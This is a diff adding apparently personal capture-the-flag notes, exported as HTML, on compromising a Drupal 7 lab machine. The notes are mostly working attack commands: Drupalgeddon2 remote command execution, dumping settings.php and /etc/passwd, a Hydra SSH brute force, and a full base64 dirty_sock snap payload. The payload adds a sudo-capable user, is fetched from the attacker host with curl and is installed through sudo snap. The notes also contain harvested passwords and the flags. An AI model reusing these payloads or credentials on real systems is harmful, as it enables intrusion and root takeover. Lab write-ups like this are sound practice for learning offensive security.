@@ -1,0 +1,102 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Drupal</title>
+</head><body><img src="image 2.png"/><br/>
+<span style="font-size: 18pt">=============================================<br/>
+</span><span style="font-size: 14pt">Basic sql injection isnt working on the webpage but I setup brute force through burp ¯\_(ツ)_/¯ <br/>
+</span><span style="font-size: 14pt">- also I noticed drupal 7 which has a few exploits</span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 18pt"><br/>
+</span><img src="image 3.png"/><br/>
+<br/>
+<span style="font-size: 18pt">=============================================</span><br/>
+https://www.exploit-db.com/exploits/44448<br/>
+https://github.com/pimps/CVE-2018-7600   &lt;-------<br/>
+<br/>
+python3 exploit.py http://10.10.10.233 -c 'ls'<br/>
+<br/>
+can't seem to spawn shell from this but ill keep trying<br/>
+<br/>
+<span style="font-size: 18pt">=============================================</span><br/>
+Looking into the sites settings give a PASSWORD!!!!!!!!!!!!!!!!!!!! FUCK YEAHHHHHHH BABBYYYYY<br/>
+<br/>
+python3 exploit.py http://10.10.10.233 -c 'cat sites/default/settings.php'<br/>
+<img src="image.png"/><br/>
+<br/>
+MYSQL login<br/>
+   'username' =&gt; 'drupaluser',<br/>
+   'password' =&gt; 'CQHEy@9M*m23gBVj'<br/>
+<br/>
+Trynna come up with a one liner is gonna be a bitch no cap. <br/>
+<span style="font-size: 18pt">=============================================<br/>
+</span><span style="font-size: 14pt">Tried /etc/passwd/ before trynna come up with this one liner</span><span style="font-size: 18pt"/><ul><li style="list-style-type: none"><span style="font-size: 14pt">python3 exploit.py http://10.10.10.233 -c 'cat /etc/passwd' --- LOL </span>i can't believe this worked<span style="font-size: 18pt"/></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 10pt">brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash</span><span style="font-size: 18pt"/></li>
+</ul>
+</li>
+<span style="font-size: 18pt"><li style="list-style-type: none"/>
+</span></ul>
+<span style="font-size: 18pt">===================================================<br/>
+Hydra brute force<br/>
+</span><span style="font-size: 14pt">hydra -l brucetherealadmin -P rockyou.txt 10.10.10.233 ssh</span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 18pt"><img src="image 4.png"/><br/>
+so</span><ul><span style="font-size: 16pt"><b><li style="list-style-type: none">brucetherealadmin : booboo</li>
+<li style="list-style-type: none"/>
+</b></span></ul>
+<span style="font-size: 18pt">===================================================<br/>
+now we try and ssh with that  &lt;--- ayeeee lit we got it<ul><li style="list-style-type: none">we are immediatly at the user flag</li>
+<li style="list-style-type: none"/>
+</ul>
+User Flag:<ul><li style="list-style-type: none">fd5e93b7b78061be3aca4f04ec5fc9a8</li>
+</ul>
+<br/>
+===================================================<br/>
+checking for sudo -l to see what we gotz</span><ul><span style="font-size: 18pt"><li style="list-style-type: none"><img src="image 5.png"/></li>
+</span><li style="list-style-type: none"><span style="font-size: 12pt"> (root) NOPASSWD: /usr/bin/snap install *</span></li>
+<li style="list-style-type: none"/>
+</ul>
+So I found this too <a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py</a><ul><li style="list-style-type: none">This did not work :( BUT BUT</li>
+<li style="list-style-type: none">we still know its a buffer overflow so I took this part of the python file.</li>
+<li style="list-style-type: none"/>
+</ul>
+<span style="font-size: 10pt">python -c &quot;print('''aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw''' + 'A' * 4256 + '==')&quot;</span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 18pt"><br/>
+now if we throw a <ul><li style="list-style-type: none">| base64 -d &gt; file.snap</li>
+<li style="list-style-type: none"/>
+</ul>
+hopefully we can install that...<ul><li style="list-style-type: none"/>
+</ul>
+Full exploit on my system, then ill updog that hoe to the victim machine<br/>
+===================================================<br/>
+</span><span style="font-size: 10pt">python -c &quot;print('''aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw''' + 'A' * 4256 + '==')&quot; | base64 -d &gt; godhelpme.snap</span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 18pt">===================================================<br/>
+file looks like this now...<br/>
+<img src="image 6.png"/><br/>
+<br/>
+updog that hoe and save it<br/>
+victim machine&gt; curl 10.10.14.13:9090/godhelpme.snap --output file.snap<br/>
+<br/>
+Run the file<ul><li style="list-style-type: none">&gt; sudo /usr/bin/snap install --devmode file.snap</li>
+<li style="list-style-type: none">switch user </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">&gt; su dirty_sock  &lt;---- password is <b>dirty_sock</b></li>
+<li style="list-style-type: none"/>
+</ul>
+</li>
+<li style="list-style-type: none">Drop into that hoe</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">&gt; sudo -s</li>
+</ul>
+</li>
+</ul>
+<br/>
+<br/>
+<br/>
+=======================================================================<br/>
+fuck this box but i got lmao<br/>
+Root:<ul><li style="list-style-type: none">79806d6c225cf67ffd49c4219f8879df</li>
+</ul>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</span></body></html>
